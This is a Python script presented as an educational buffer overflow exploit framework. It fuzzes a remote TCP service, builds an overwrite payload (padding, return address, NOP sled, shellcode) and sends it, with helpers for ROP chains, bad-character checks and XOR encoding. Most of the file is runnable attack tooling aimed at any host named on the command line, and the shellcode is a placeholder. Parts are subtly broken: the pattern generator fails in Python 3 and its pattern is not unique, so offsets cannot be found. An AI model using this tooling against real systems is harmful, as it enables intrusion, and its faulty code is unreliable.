#!/usr/bin/env python3
"""
Buffer Overflow Exploit Framework
Educational example demonstrating buffer overflow exploitation concepts.
WARNING: For authorized security testing only!
"""

import struct
import socket
import sys
from typing import List, Optional

class BufferOverflowExploit:
    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.pattern = None
        self.offset = None
        self.eip = None
    
    def generate_pattern(self, length: int) -> bytes:
        """Generate cyclic pattern for offset identification"""
        pattern = b''
        chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        for i in range(length):
            pattern += chars[i % len(chars)]
        return pattern
    
    def find_offset(self, pattern: bytes, crash_value: bytes) -> Optional[int]:
        """Find offset in pattern where crash occurred"""
        try:
            # Convert crash value to string
            crash_str = crash_value.decode('utf-8', errors='ignore')
            if len(crash_str) >= 4:
                # Find position in pattern
                for i in range(len(pattern) - 4):
                    if pattern[i:i+4] == crash_str[:4].encode():
                        return i
        except:
            pass
        return None
    
    def create_shellcode(self, shellcode_type: str = 'calc') -> bytes:
        """Generate shellcode (Windows calc.exe example)"""
        # This is a simple example - real shellcode would be more complex
        # For educational purposes only
        if shellcode_type == 'calc':
            # Placeholder - real shellcode would execute calc.exe
            # In practice, use msfvenom or similar tools
            return b'\x90' * 50  # NOP sled placeholder
        return b''
    
    def create_exploit_payload(self, offset: int, eip: bytes, shellcode: bytes) -> bytes:
        """Create complete exploit payload"""
        # Buffer overflow payload structure:
        # [Padding] + [EIP] + [NOP Sled] + [Shellcode]
        
        padding = b'A' * offset
        nop_sled = b'\x90' * 20  # NOP instructions
        
        payload = padding + eip + nop_sled + shellcode
        return payload
    
    def send_payload(self, payload: bytes) -> bool:
        """Send exploit payload to target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_host, self.target_port))
            
            # Send payload
            sock.send(payload)
            
            # Wait for response
            try:
                response = sock.recv(1024)
                print(f"[+] Response received: {len(response)} bytes")
            except:
                print("[+] No response (possible crash)")
            
            sock.close()
            return True
        except Exception as e:
            print(f"[-] Error sending payload: {e}")
            return False
    
    def test_overflow(self, buffer_size: int = 100) -> bool:
        """Test for buffer overflow vulnerability"""
        print(f"[*] Testing buffer overflow with {buffer_size} bytes...")
        
        # Generate test pattern
        pattern = self.generate_pattern(buffer_size)
        
        # Send pattern
        if self.send_payload(pattern):
            print("[+] Test pattern sent successfully")
            print("[!] Check target for crash/overflow")
            return True
        return False
    
    def exploit(self, offset: int, eip_address: str, shellcode: bytes) -> bool:
        """Execute buffer overflow exploit"""
        print(f"[*] Creating exploit payload...")
        print(f"    Offset: {offset}")
        print(f"    EIP: {eip_address}")
        
        # Convert EIP address to bytes (little-endian)
        try:
            eip_bytes = struct.pack('<I', int(eip_address, 16))
        except:
            eip_bytes = eip_address.encode()[:4]
        
        # Create payload
        payload = self.create_exploit_payload(offset, eip_bytes, shellcode)
        
        print(f"[*] Payload size: {len(payload)} bytes")
        print(f"[*] Sending exploit...")
        
        return self.send_payload(payload)
    
    def generate_report(self) -> str:
        """Generate exploit development report"""
        report = f"# Buffer Overflow Exploit Report\n\n"
        report += f"**Target**: {self.target_host}:{self.target_port}\n\n"
        report += f"## Exploit Details\n\n"
        
        if self.offset:
            report += f"- **Offset**: {self.offset}\n"
        if self.eip:
            report += f"- **EIP Address**: {self.eip}\n"
        
        report += f"\n## Exploitation Steps\n\n"
        report += f"1. Fuzz the application to find buffer overflow\n"
        report += f"2. Identify exact offset using pattern\n"
        report += f"3. Find JMP ESP or similar instruction address\n"
        report += f"4. Generate shellcode\n"
        report += f"5. Create and send final payload\n"
        
        return report

class ExploitDevelopment:
    """Exploit development utilities"""
    
    @staticmethod
    def generate_rop_chain(gadgets: List[dict]) -> bytes:
        """Generate ROP (Return-Oriented Programming) chain"""
        rop_chain = b''
        for gadget in gadgets:
            address = struct.pack('<I', gadget['address'])
            rop_chain += address
        return rop_chain
    
    @staticmethod
    def find_bad_chars(payload: bytes, bad_chars: List[int]) -> List[int]:
        """Identify bad characters in payload"""
        found_bad = []
        for char in payload:
            if char in bad_chars:
                found_bad.append(char)
        return found_bad
    
    @staticmethod
    def encode_payload(payload: bytes, encoding: str = 'xor') -> bytes:
        """Encode payload to avoid bad characters"""
        if encoding == 'xor':
            key = 0xAA
            encoded = bytes([b ^ key for b in payload])
            return encoded
        return payload

def main():
    if len(sys.argv) < 3:
        print("Usage: python buffer_overflow_exploit.py <target_host> <target_port> [offset] [eip]")
        print("Example: python buffer_overflow_exploit.py 192.168.1.100 9999")
        print("         python buffer_overflow_exploit.py 192.168.1.100 9999 200 0x41414141")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    exploit = BufferOverflowExploit(target_host, target_port)
    
    if len(sys.argv) >= 5:
        # Full exploit mode
        offset = int(sys.argv[3])
        eip = sys.argv[4]
        shellcode = exploit.create_shellcode()
        
        print("[*] Running full exploit...")
        exploit.exploit(offset, eip, shellcode)
    else:
        # Test mode
        print("[*] Running buffer overflow test...")
        exploit.test_overflow(200)
    
    # Generate report
    report = exploit.generate_report()
    with open('exploit_report.md', 'w') as f:
        f.write(report)
    
    print(f"\n[+] Report saved to exploit_report.md")
    print(f"[!] WARNING: Only test on systems you own or have permission to test!")
    print(f"[!] This is for educational purposes only!")

if __name__ == '__main__':
    main()

